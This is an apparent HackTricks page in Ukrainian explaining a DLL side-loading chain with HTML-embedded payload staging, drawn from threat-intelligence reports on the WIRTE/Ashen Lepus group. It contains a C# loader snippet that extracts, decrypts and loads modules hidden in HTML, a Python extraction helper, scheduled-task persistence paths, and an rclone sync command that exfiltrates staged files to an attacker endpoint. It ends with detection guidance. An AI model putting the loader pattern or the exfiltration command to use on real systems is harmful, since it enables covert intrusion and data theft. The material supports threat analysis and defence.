# Розширений DLL Side-Loading із HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Огляд методики

Ashen Lepus (aka WIRTE) використав повторюваний патерн, який зв'язує DLL sideloading, staged HTML payloads та модульні .NET backdoors для утримання присутності в дипломатичних мережах Близького Сходу. Техніка придатна для повторного використання будь-яким оператором, оскільки вона базується на:

- **Archive-based social engineering**: невинні PDF-файли інструктують цілі завантажити RAR-архів з файлообмінного сайту. Архів містить реалістичний EXE переглядача документів, шкідливий DLL, названий як довірена бібліотека (наприклад, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), та підставний `Document.pdf`.
- **DLL search order abuse**: жертва подвійно клікає EXE, Windows вирішує імпорт DLL з поточного каталогу, і шкідливий лоадер (AshenLoader) виконується всередині довіреного процесу, поки підставний PDF відкривається, щоб уникнути підозри.
- **Living-off-the-land staging**: кожен наступний етап (AshenStager → AshenOrchestrator → modules) зберігається не на диску до моменту потреби і доставляється як зашифровані блоґи, сховані в інакше нешкідливих HTML-відповідях.

## Багатоступеневий Side-Loading ланцюг

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader, який виконує розвідку хоста, шифрує його AES-CTR та відправляє методом POST всередині змінних параметрів, таких як `token=`, `id=`, `q=` або `auth=`, до шляхів, що виглядають як API (наприклад, `/api/v2/account`).
2. **HTML extraction**: C2 видає наступний етап лише коли IP клієнта геолокалізується в цільовому регіоні і `User-Agent` відповідає імпланту, ускладнюючи роботу sandboxes. Коли перевірки проходять, тіло HTTP містить `<headerp>...</headerp>` блоб з Base64/AES-CTR зашифрованим AshenStager payload.
3. **Second sideload**: AshenStager розгортається разом із іншим легітимним бінаром, який імпортує `wtsapi32.dll`. Зловмисна копія, інжектована в бінар, отримує більше HTML, цього разу вирізаючи `<article>...</article>` щоб відновити AshenOrchestrator.
4. **AshenOrchestrator**: модульний .NET контролер, який декодує Base64 JSON конфіг. Поля конфіга `tg` та `au` конкатенуються/хешуються в AES-ключ, який дешифрує `xrk`. Отримані байти слугують XOR-ключем для кожного модульного блобу, що отримується надалі.
5. **Module delivery**: кожен модуль описується через HTML-коментарі, які перенаправляють парсер до довільного тегу, обходячи статичні правила, що шукають лише `<headerp>` або `<article>`. Модулі включають persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) та file exploration (`FE`).

### Шаблон парсингу HTML-контейнера
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Навіть якщо захисники блокують або видаляють певний елемент, оператору потрібно лише змінити тег, зазначений у HTML-коментарі, щоб відновити доставку.

### Швидкий помічник для витягання (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Паралелі ухилення HTML Staging

Останні дослідження HTML smuggling (Talos) показують payload'и, заховані як Base64-рядки всередині блоків <script> у HTML-вкладеннях і декодовані за допомогою JavaScript під час виконання. Той самий прийом можна повторно використати для C2-відповідей: стажуйте зашифровані блоби всередині тега script (або іншого DOM-елемента) і декодуйте їх в пам'яті перед AES/XOR, щоб сторінка виглядала як звичайний HTML. Talos також показує багаторівневу обфускацію (перейменування ідентифікаторів плюс Base64/Caesar/AES) всередині тегів <script>, що добре відображається на HTML-staged C2 blobs.

## Останні зауваги щодо варіантів (2024-2025)

- Check Point спостерігав кампанії WIRTE у 2024, які все ще спиралися на archive-based sideloading, але використовували `propsys.dll` (stagerx64) як перший етап. Стейджер декодує наступний payload через Base64 + XOR (ключ `53`), надсилає HTTP-запити з захардкодженим `User-Agent` і витягує зашифровані блоби, вбудовані між HTML-тегами. В одній гілці stage був реконструйований із довгого списку вбудованих IP-рядків, декодованих через `RtlIpv4StringToAddressA`, а потім конкатенованих у байти payload'а.
- OWN-CERT задокументував ранніше WIRTE інструментарій, де side-loaded `wtsapi32.dll` dropper захищав рядки Base64 + TEA і використовував ім'я DLL як ключ для дешифрування, а потім застосовував XOR/Base64-обфускацію для даних ідентифікації хоста перед відправкою на C2.

## Крипто- та C2-зміцнення

- **AES-CTR скрізь**: поточні loaders вбудовують 256-бітні ключі плюс nonces (наприклад, {9a 20 51 98 ...}) і опційно додають шар XOR, використовуючи рядки на кшталт `msasn1.dll` до/після дешифрування.
- **Варіації ключового матеріалу**: ранні лоадери використовували Base64 + TEA для захисту вбудованих рядків, причому ключ дешифрування виводився з імені зловмисної DLL (наприклад, `wtsapi32.dll`).
- **Розподіл інфраструктури + маскування субдоменів**: staging-сервери розділені за інструментами, розміщені в різних ASN і іноді прикриті легітимними субдоменами, тому компрометація одного етапу не розкриває решту.
- **Recon smuggling**: перелік зібраних даних тепер включає списки Program Files для виявлення цінних додатків і завжди шифрується перед відправкою з хоста.
- **URI churn**: query-параметри та REST-шляхи змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), що робить детекції нестійкими.
- **User-Agent pinning + safe redirects**: C2-інфраструктура відповідає лише на точні UA-рядки, інакше редиректить на нешкідливі новинні/медичні сайти, щоб зливатися з трафіком.
- **Gated delivery**: сервери гео-фільтруються і відповідають тільки реальним імплантам. Непогоджені клієнти отримують нешкідливий HTML.

## Персистенція та цикл виконання

AshenStager створює scheduled tasks, які маскуються під завдання з обслуговування Windows і виконуються через `svchost.exe`, наприклад:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці завдання перезапускають ланцюжок sideloading під час завантаження або за інтервалами, гарантуючи, що AshenOrchestrator може запитувати свіжі модулі без повторного запису на диск.

## Використання легітимних sync-клієнтів для ексфільтрації

Оператори стажують дипломатичні документи в `C:\Users\Public` (доступно для всіх і не підозріло) через спеціальний модуль, потім завантажують легітимний [Rclone](https://rclone.org/) бінарник для синхронізації цієї директорії з атакуючим сховищем. Unit42 зауважує, що це перший випадок, коли цей актор використав Rclone для ексфільтрації, що корелює з більш широкою тенденцією зловживання легітимними sync-інструментами для маскування в нормальному трафіку:

1. Stage: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. Configure: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. Sync: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Оскільки Rclone широко використовується для легітимних бекапів, захисникам слід звертати увагу на аномальні виконання (нові бінарники, підозрілі remotes або раптову синхронізацію `C:\Users\Public`).

## Пункти детекції

- Сигналізувати про **підписані процеси**, які несподівано завантажують DLL з шляхів, доступних для запису користувачем (фільтри Procmon + `Get-ProcessMitigation -Module`), особливо коли імена DLL збігаються з `netutils`, `srvcli`, `dwampi` або `wtsapi32`.
- Перевіряти підозрілі HTTPS-відповіді на **великі Base64-блоби, вбудовані всередину незвичних тегів**, або захищені коментарями на кшталт `<!-- TAG: <xyz> -->`.
- Розширити пошук в HTML до **Base64-рядків всередині блоків <script>** (HTML smuggling-стайл стажинг), які декодуються через JavaScript перед AES/XOR-обробкою.
- Шукати **scheduled tasks**, що запускають `svchost.exe` з не сервісними аргументами або які посилаються назад у директорії droppers.
- Відслідковувати **C2-редиректи**, що повертають payload лише для точних `User-Agent` рядків і в інших випадках перекидають на легітимні новинні/медичні домени.
- Моніторити появу бінарників **Rclone** поза IT-керованими локаціями, нові `rclone.conf` файли або синхронізації зі staging-директорій на кшталт `C:\Users\Public`.

## Джерела

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
